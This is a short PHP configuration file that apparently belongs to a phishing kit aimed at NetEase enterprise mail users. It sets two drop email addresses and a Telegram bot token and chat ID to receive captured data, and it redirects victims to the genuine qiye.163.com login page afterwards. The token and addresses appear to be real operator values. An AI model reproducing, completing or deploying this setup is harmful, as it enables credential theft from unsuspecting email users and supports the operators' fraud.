<?php 
// Email configuration
$Receive_email="smart.dice@yandex.com,sunnero1337@protonmail.com";

// Telegram configuration
$telegram_bot_token = '7632892567:AAGRKFK7qOTbVcWyvyLzKclmZM4pbzSY9FM'; // Your bot token
$telegram_chat_id = '1252864636'; // Your chat ID

// Redirect configuration
$redirect="https://qiye.163.com/login";
?>